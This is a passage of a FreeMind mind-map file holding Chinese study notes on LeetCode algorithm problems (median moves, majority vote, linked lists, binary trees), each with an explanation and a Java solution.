        carry = (x + y + carry) / 10;
    }
    return str.reverse().toString();
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1416334155" CREATED="1754751536092" MODIFIED="1754751536092"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      相遇问题
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_986356584" CREATED="1754751536093" MODIFIED="1754751536095"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 改变数组元素使所有的数组元素都相等
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      462. Minimum Moves to Equal Array Elements II (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/minimum-moves-to-equal-array-elements-ii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/minimum-moves-to-equal-array-elements-ii/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input:
[1,2,3]
Output:
2
Explanation:
Only two moves are needed (remember each move increments or decrements one element):
[1,2,3]  =&gt;  [2,2,3]  =&gt;  [2,2,2]</code></pre>
    <p>
      每次可以对一个数组元素加一或者减一，求最小的改变次数。
    </p>
    <p>
      这是个典型的相遇问题，移动距离最小的方式是所有元素都移动到中位数。理由如下：
    </p>
    <p>
      设 m 为中位数。a 和 b 是 m 两边的两个元素，且 b &gt; a。要使 a 和 b 相等，它们总共移动的次数为 b - a，这个值等于 (b - m) + (m - a)，也就是把这两个数移动到中位数的移动次数。
    </p>
    <p>
      设数组长度为 N，则可以找到 N/2 对 a 和 b 的组合，使它们都移动到 m 的位置。
    </p>
    <p>
      <strong>解法 1</strong>
    </p>
    <p>
      先排序，时间复杂度：O(NlogN)
    </p>
    <pre><code class="language-plaintext">public int minMoves2(int[] nums) {
    Arrays.sort(nums);
    int move = 0;
    int l = 0, h = nums.length - 1;
    while (l &lt;= h) {
        move += nums[h] - nums[l];
        l++;
        h--;
    }
    return move;
}</code></pre>
    <p>
      <strong>解法 2</strong>
    </p>
    <p>
      使用快速选择找到中位数，时间复杂度 O(N)
    </p>
    <pre><code class="language-plaintext">public int minMoves2(int[] nums) {
    int move = 0;
    int median = findKthSmallest(nums, nums.length / 2);
    for (int num : nums) {
        move += Math.abs(num - median);
    }
    return move;
}
private int findKthSmallest(int[] nums, int k) {
    int l = 0, h = nums.length - 1;
    while (l &lt; h) {
        int j = partition(nums, l, h);
        if (j == k) {
            break;
        }
        if (j &lt; k) {
            l = j + 1;
        } else {
            h = j - 1;
        }
    }
    return nums[k];
}
private int partition(int[] nums, int l, int h) {
    int i = l, j = h + 1;
    while (true) {
        while (nums[++i] &lt; nums[l] &amp;&amp; i &lt; h) ;
        while (nums[--j] &gt; nums[l] &amp;&amp; j &gt; l) ;
        if (i &gt;= j) {
            break;
        }
        swap(nums, i, j);
    }
    swap(nums, l, j);
    return j;
}
private void swap(int[] nums, int i, int j) {
    int tmp = nums[i];
    nums[i] = nums[j];
    nums[j] = tmp;
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_695678111" CREATED="1754751536096" MODIFIED="1754751536096"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      多数投票问题
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_609382529" CREATED="1754751536100" MODIFIED="1754751536104"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 数组中出现次数多于 n / 2 的元素
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      169. Majority Element (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/majority-element/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/majority-element/description/">力扣</a>
    </p>
    <p>
      先对数组排序，最中间那个数出现次数一定多于 n / 2。
    </p>
    <pre><code class="language-plaintext">public int majorityElement(int[] nums) {
    Arrays.sort(nums);
    return nums[nums.length / 2];
}</code></pre>
    <p>
      可以利用 Boyer-Moore Majority Vote Algorithm 来解决这个问题，使得时间复杂度为 O(N)。可以这么理解该算法：使用 cnt 来统计一个元素出现的次数，当遍历到的元素和统计元素不相等时，令 cnt--。如果前面查找了 i 个元素，且 cnt == 0，说明前 i 个元素没有 majority，或者有 majority，但是出现的次数少于 i / 2，因为如果多于 i / 2 的话 cnt 就一定不会为 0。此时剩下的 n - i 个元素中，majority 的数目依然多于 (n - i) / 2，因此继续查找就能找出 majority。
    </p>
    <pre><code class="language-plaintext">public int majorityElement(int[] nums) {
    int cnt = 0, majority = nums[0];
    for (int num : nums) {
        majority = (cnt == 0) ? num : majority;
        cnt = (majority == num) ? cnt + 1 : cnt - 1;
    }
    return majority;
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1417522134" CREATED="1754751536104" MODIFIED="1754751536104"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      其它
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1002271932" CREATED="1754751536106" MODIFIED="1754751536107"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 平方数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      367. Valid Perfect Square (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/valid-perfect-square/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/valid-perfect-square/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: 16
Returns: True</code></pre>
    <p>
      平方序列：1,4,9,16,..
    </p>
    <p>
      间隔：3,5,7,...
    </p>
    <p>
      间隔为等差数列，使用这个特性可以得到从 1 开始的平方序列。
    </p>
    <pre><code class="language-plaintext">public boolean isPerfectSquare(int num) {
    int subNum = 1;
    while (num &gt; 0) {
        num -= subNum;
        subNum += 2;
    }
    return num == 0;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_469820668" CREATED="1754751536108" MODIFIED="1754751536109"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 3 的 n 次方
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      326. Power of Three (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/power-of-three/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/power-of-three/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">public boolean isPowerOfThree(int n) {
    return n &gt; 0 &amp;&amp; (1162261467 % n == 0);
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_283231710" CREATED="1754751536110" MODIFIED="1754751536111"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 乘积数组
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      238. Product of Array Except Self (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/product-of-array-except-self/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/product-of-array-except-self/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">For example, given [1,2,3,4], return [24,12,8,6].</code></pre>
    <p>
      给定一个数组，创建一个新数组，新数组的每个元素为原始数组中除了该位置上的元素之外所有元素的乘积。
    </p>
    <p>
      要求时间复杂度为 O(N)，并且不能使用除法。
    </p>
    <pre><code class="language-plaintext">public int[] productExceptSelf(int[] nums) {
    int n = nums.length;
    int[] products = new int[n];
    Arrays.fill(products, 1);
    int left = 1;
    for (int i = 1; i &lt; n; i++) {
        left *= nums[i - 1];
        products[i] *= left;
    }
    int right = 1;
    for (int i = n - 2; i &gt;= 0; i--) {
        right *= nums[i + 1];
        products[i] *= right;
    }
    return products;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1701234767" CREATED="1754751536112" MODIFIED="1754751536114"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 找出数组中的乘积最大的三个数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      628. Maximum Product of Three Numbers (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/maximum-product-of-three-numbers/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/maximum-product-of-three-numbers/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: [1,2,3,4]
Output: 24</code></pre>
    <pre><code class="language-plaintext">public int maximumProduct(int[] nums) {
    int max1 = Integer.MIN_VALUE, max2 = Integer.MIN_VALUE, max3 = Integer.MIN_VALUE, min1 = Integer.MAX_VALUE, min2 = Integer.MAX_VALUE;
    for (int n : nums) {
        if (n &gt; max1) {
            max3 = max2;
            max2 = max1;
            max1 = n;
        } else if (n &gt; max2) {
            max3 = max2;
            max2 = n;
        } else if (n &gt; max3) {
            max3 = n;
        }
        if (n &lt; min1) {
            min2 = min1;
            min1 = n;
        } else if (n &lt; min2) {
            min2 = n;
        }
    }
    return Math.max(max1*max2*max3, max1*min1*min2);
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_903261370" CREATED="1754750422726" MODIFIED="1754750427138" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      数据结构相关
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_560618215" CREATED="1754750427111" MODIFIED="1754751555127" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E9%93%BE%E8%A1%A8.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    链表
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      链表是空节点，或者有一个值和一个指向下一个链表的指针，因此很多链表问题可以用递归来处理。
    </p>
  </body>
</html></richcontent>
<node ID="ID_241634762" CREATED="1754751555129" MODIFIED="1754751555131"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 找出两个链表的交点
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      160. Intersection of Two Linked Lists (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/intersection-of-two-linked-lists/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists/description/">力扣</a>
    </p>
    <p>
      例如以下示例中 A 和 B 两个链表相交于 c1：
    </p>
    <pre>A:          a1 → a2
                    ↘
                      c1 → c2 → c3
                    ↗
B:    b1 → b2 → b3</pre>
    <p>
      但是不会出现以下相交的情况，因为每个节点只有一个 next 指针，也就只能有一个后继节点，而以下示例中节点 c 有两个后继节点。
    </p>
    <pre>A:          a1 → a2       d1 → d2
                    ↘  ↗
                      c
                    ↗  ↘
B:    b1 → b2 → b3        e1 → e2</pre>
    <p>
      要求时间复杂度为 O(N)，空间复杂度为 O(1)。如果不存在交点则返回 null。
    </p>
    <p>
      设 A 的长度为 a + c，B 的长度为 b + c，其中 c 为尾部公共部分长度，可知 a + c + b = b + c + a。
    </p>
    <p>
      当访问 A 链表的指针访问到链表尾部时，令它从链表 B 的头部开始访问链表 B；同样地，当访问 B 链表的指针访问到链表尾部时，令它从链表 A 的头部开始访问链表 A。这样就能控制访问 A 和 B 两个链表的指针能同时访问到交点。
    </p>
    <p>
      如果不存在交点，那么 a + b = b + a，以下实现代码中 l1 和 l2 会同时为 null，从而退出循环。
    </p>
    <pre>public ListNode getIntersectionNode(ListNode headA, ListNode headB) {
    ListNode l1 = headA, l2 = headB;
    while (l1 != l2) {
        l1 = (l1 == null) ? headB : l1.next;
        l2 = (l2 == null) ? headA : l2.next;
    }
    return l1;
}</pre>
    <p>
      如果只是判断是否存在交点，那么就是另一个问题，即 <a>编程之美 3.6</a>&#xa0;的问题。有两种解法：
    </p>
    <ul>
      <li>
        把第一个链表的结尾连接到第二个链表的开头，看第二个链表是否存在环；
      </li>
      <li>
        或者直接比较两个链表的最后一个节点是否相同。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_52290586" CREATED="1754751555131" MODIFIED="1754751555134"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 链表反转
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      206. Reverse Linked List (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/reverse-linked-list/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/reverse-linked-list/description/">力扣</a>
    </p>
    <p>
      递归
    </p>
    <pre>public ListNode reverseList(ListNode head) {
    if (head == null || head.next == null) {
        return head;
    }
    ListNode next = head.next;
    ListNode newHead = reverseList(next);
    next.next = head;
    head.next = null;
    return newHead;
}</pre>
    <p>
      头插法
    </p>
    <pre>public ListNode reverseList(ListNode head) {
    ListNode newHead = new ListNode(-1);
    while (head != null) {
        ListNode next = head.next;
        head.next = newHead.next;
        newHead.next = head;
        head = next;
    }
    return newHead.next;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_755861402" CREATED="1754751555134" MODIFIED="1754751555136"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 归并两个有序的链表
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      21. Merge Two Sorted Lists (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/merge-two-sorted-lists/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/description/">力扣</a>
    </p>
    <pre>public ListNode mergeTwoLists(ListNode l1, ListNode l2) {
    if (l1 == null) return l2;
    if (l2 == null) return l1;
    if (l1.val &lt; l2.val) {
        l1.next = mergeTwoLists(l1.next, l2);
        return l1;
    } else {
        l2.next = mergeTwoLists(l1, l2.next);
        return l2;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_986233443" CREATED="1754751555136" MODIFIED="1754751555138"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 从有序链表中删除重复节点
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      83. Remove Duplicates from Sorted List (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/remove-duplicates-from-sorted-list/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list/description/">力扣</a>
    </p>
    <pre>Given 1-&gt;1-&gt;2, return 1-&gt;2.
Given 1-&gt;1-&gt;2-&gt;3-&gt;3, return 1-&gt;2-&gt;3.</pre>
    <pre>public ListNode deleteDuplicates(ListNode head) {
    if (head == null || head.next == null) return head;
    head.next = deleteDuplicates(head.next);
    return head.val == head.next.val ? head.next : head;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_265390744" CREATED="1754751555138" MODIFIED="1754751555141"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 删除链表的倒数第 n 个节点
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      19. Remove Nth Node From End of List (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/remove-nth-node-from-end-of-list/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/description/">力扣</a>
    </p>
    <pre>Given linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5, and n = 2.
After removing the second node from the end, the linked list becomes 1-&gt;2-&gt;3-&gt;5.</pre>
    <pre>public ListNode removeNthFromEnd(ListNode head, int n) {
    ListNode fast = head;
    while (n-- &gt; 0) {
        fast = fast.next;
    }
    if (fast == null) return head.next;
    ListNode slow = head;
    while (fast.next != null) {
        fast = fast.next;
        slow = slow.next;
    }
    slow.next = slow.next.next;
    return head;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_765963161" CREATED="1754751555143" MODIFIED="1754751555145"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 交换链表中的相邻结点
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      24. Swap Nodes in Pairs (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/swap-nodes-in-pairs/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/description/">力扣</a>
    </p>
    <pre>Given 1-&gt;2-&gt;3-&gt;4, you should return the list as 2-&gt;1-&gt;4-&gt;3.</pre>
    <p>
      题目要求：不能修改结点的 val 值，O(1) 空间复杂度。
    </p>
    <pre>public ListNode swapPairs(ListNode head) {
    ListNode node = new ListNode(-1);
    node.next = head;
    ListNode pre = node;
    while (pre.next != null &amp;&amp; pre.next.next != null) {
        ListNode l1 = pre.next, l2 = pre.next.next;
        ListNode next = l2.next;
        l1.next = next;
        l2.next = l1;
        pre.next = l2;
        pre = l1;
    }
    return node.next;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1420345958" CREATED="1754751555145" MODIFIED="1754751555147"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. 链表求和
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      445. Add Two Numbers II (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/add-two-numbers-ii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/add-two-numbers-ii/description/">力扣</a>
    </p>
    <pre>Input: (7 -&gt; 2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)
Output: 7 -&gt; 8 -&gt; 0 -&gt; 7</pre>
    <p>
      题目要求：不能修改原始链表。
    </p>
    <pre>public ListNode addTwoNumbers(ListNode l1, ListNode l2) {
    Stack&lt;Integer&gt; l1Stack = buildStack(l1);
    Stack&lt;Integer&gt; l2Stack = buildStack(l2);
    ListNode head = new ListNode(-1);
    int carry = 0;
    while (!l1Stack.isEmpty() || !l2Stack.isEmpty() || carry != 0) {
        int x = l1Stack.isEmpty() ? 0 : l1Stack.pop();
        int y = l2Stack.isEmpty() ? 0 : l2Stack.pop();
        int sum = x + y + carry;
        ListNode node = new ListNode(sum % 10);
        node.next = head.next;
        head.next = node;
        carry = sum / 10;
    }
    return head.next;
}
private Stack&lt;Integer&gt; buildStack(ListNode l) {
    Stack&lt;Integer&gt; stack = new Stack&lt;&gt;();
    while (l != null) {
        stack.push(l.val);
        l = l.next;
    }
    return stack;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_681539972" CREATED="1754751555148" MODIFIED="1754751555151"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      8. 回文链表
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      234. Palindrome Linked List (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/palindrome-linked-list/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/palindrome-linked-list/description/">力扣</a>
    </p>
    <p>
      题目要求：以 O(1) 的空间复杂度来求解。
    </p>
    <p>
      切成两半，把后半段反转，然后比较两半是否相等。
    </p>
    <pre>public boolean isPalindrome(ListNode head) {
    if (head == null || head.next == null) return true;
    ListNode slow = head, fast = head.next;
    while (fast != null &amp;&amp; fast.next != null) {
        slow = slow.next;
        fast = fast.next.next;
    }
    if (fast != null) slow = slow.next;  // 偶数节点，让 slow 指向下一个节点
    cut(head, slow);                     // 切成两个链表
    return isEqual(head, reverse(slow));
}
private void cut(ListNode head, ListNode cutNode) {
    while (head.next != cutNode) {
        head = head.next;
    }
    head.next = null;
}
private ListNode reverse(ListNode head) {
    ListNode newHead = null;
    while (head != null) {
        ListNode nextNode = head.next;
        head.next = newHead;
        newHead = head;
        head = nextNode;
    }
    return newHead;
}
private boolean isEqual(ListNode l1, ListNode l2) {
    while (l1 != null &amp;&amp; l2 != null) {
        if (l1.val != l2.val) return false;
        l1 = l1.next;
        l2 = l2.next;
    }
    return true;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1378925399" CREATED="1754751555152" MODIFIED="1754751555154"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      9. 分隔链表
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      725. Split Linked List in Parts(Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/split-linked-list-in-parts/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/split-linked-list-in-parts/description/">力扣</a>
    </p>
    <pre>Input:
root = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10], k = 3
Output: [[1, 2, 3, 4], [5, 6, 7], [8, 9, 10]]
Explanation:
The input has been split into consecutive parts with size difference at most 1, and earlier parts are a larger size than the later parts.</pre>
    <p>
      题目描述：把链表分隔成 k 部分，每部分的长度都应该尽可能相同，排在前面的长度应该大于等于后面的。
    </p>
    <pre>public ListNode[] splitListToParts(ListNode root, int k) {
    int N = 0;
    ListNode cur = root;
    while (cur != null) {
        N++;
        cur = cur.next;
    }
    int mod = N % k;
    int size = N / k;
    ListNode[] ret = new ListNode[k];
    cur = root;
    for (int i = 0; cur != null &amp;&amp; i &lt; k; i++) {
        ret[i] = cur;
        int curSize = size + (mod-- &gt; 0 ? 1 : 0);
        for (int j = 0; j &lt; curSize - 1; j++) {
            cur = cur.next;
        }
        ListNode next = cur.next;
        cur.next = null;
        cur = next;
    }
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_960658318" CREATED="1754751555154" MODIFIED="1754751555156"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      10. 链表元素按奇偶聚集
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      328. Odd Even Linked List (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/odd-even-linked-list/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/odd-even-linked-list/description/">力扣</a>
    </p>
    <pre>Example:
Given 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL,
return 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL.</pre>
    <pre>public ListNode oddEvenList(ListNode head) {
    if (head == null) {
        return head;
    }
    ListNode odd = head, even = head.next, evenHead = even;
    while (even != null &amp;&amp; even.next != null) {
        odd.next = odd.next.next;
        odd = odd.next;
        even.next = even.next.next;
        even = even.next;
    }
    odd.next = evenHead;
    return head;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1579283920" CREATED="1754750427114" MODIFIED="1754751555157" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%A0%91.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    树
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1417211261" CREATED="1754751555158" MODIFIED="1754751555159"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      递归
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      一棵树要么是空树，要么有两个指针，每个指针指向一棵树。树是一种递归结构，很多树的问题可以使用递归来处理。
    </p>
  </body>
</html></richcontent>
<node ID="ID_807561509" CREATED="1754751555160" MODIFIED="1754751555162"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 树的高度
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      104. Maximum Depth of Binary Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/maximum-depth-of-binary-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/description/">力扣</a>
    </p>
    <pre>public int maxDepth(TreeNode root) {
    if (root == null) return 0;
    return Math.max(maxDepth(root.left), maxDepth(root.right)) + 1;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_171280677" CREATED="1754751555163" MODIFIED="1754751555166"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 平衡树
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      110. Balanced Binary Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/balanced-binary-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/balanced-binary-tree/description/">力扣</a>
    </p>
    <pre>3
   / \
  9  20
    /  \
   15   7</pre>
    <p>
      平衡树左右子树高度差都小于等于 1
    </p>
    <pre>private boolean result = true;
public boolean isBalanced(TreeNode root) {
    maxDepth(root);
    return result;
}
public int maxDepth(TreeNode root) {
    if (root == null) return 0;
    int l = maxDepth(root.left);
    int r = maxDepth(root.right);
    if (Math.abs(l - r) &gt; 1) result = false;
    return 1 + Math.max(l, r);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1899113973" CREATED="1754751555167" MODIFIED="1754751555168"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 两节点的最长路径
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      543. Diameter of Binary Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/diameter-of-binary-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/diameter-of-binary-tree/description/">力扣</a>
    </p>
    <pre>Input:
         1
        / \
       2  3
      / \
     4   5
Return 3, which is the length of the path [4,2,1,3] or [5,2,1,3].</pre>
    <pre>private int max = 0;
public int diameterOfBinaryTree(TreeNode root) {
    depth(root);
    return max;
}
private int depth(TreeNode root) {
    if (root == null) return 0;
    int leftDepth = depth(root.left);
    int rightDepth = depth(root.right);
    max = Math.max(max, leftDepth + rightDepth);
    return Math.max(leftDepth, rightDepth) + 1;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1709740360" CREATED="1754751555169" MODIFIED="1754751555171"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 翻转树
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      226. Invert Binary Tree (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/invert-binary-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/invert-binary-tree/description/">力扣</a>
    </p>
    <pre>public TreeNode invertTree(TreeNode root) {
    if (root == null) return null;
    TreeNode left = root.left;  // 后面的操作会改变 left 指针，因此先保存下来
    root.left = invertTree(root.right);
    root.right = invertTree(left);
    return root;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_634283671" CREATED="1754751555172" MODIFIED="1754751555174"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 归并两棵树
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      617. Merge Two Binary Trees (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/merge-two-binary-trees/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/merge-two-binary-trees/description/">力扣</a>
    </p>
    <pre>Input:
       Tree 1                     Tree 2
          1                         2
         / \                       / \
        3   2                     1   3
       /                           \   \
      5                             4   7
Output:
         3
        / \
       4   5
      / \   \
     5   4   7</pre>
    <pre>public TreeNode mergeTrees(TreeNode t1, TreeNode t2) {
    if (t1 == null &amp;&amp; t2 == null) return null;
    if (t1 == null) return t2;
    if (t2 == null) return t1;
    TreeNode root = new TreeNode(t1.val + t2.val);
    root.left = mergeTrees(t1.left, t2.left);
    root.right = mergeTrees(t1.right, t2.right);
    return root;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_621527252" CREATED="1754751555174" MODIFIED="1754751555176"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 判断路径和是否等于一个数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      Leetcdoe : 112. Path Sum (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/path-sum/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/path-sum/description/">力扣</a>
    </p>
    <pre>Given the below binary tree and sum = 22,
              5
             / \
            4   8
           /   / \
          11  13  4
         /  \      \
        7    2      1
return true, as there exist a root-to-leaf path 5-&gt;4-&gt;11-&gt;2 which sum is 22.</pre>
    <p>
      路径和定义为从 root 到 leaf 的所有节点的和。
    </p>
    <pre>public boolean hasPathSum(TreeNode root, int sum) {
    if (root == null) return false;
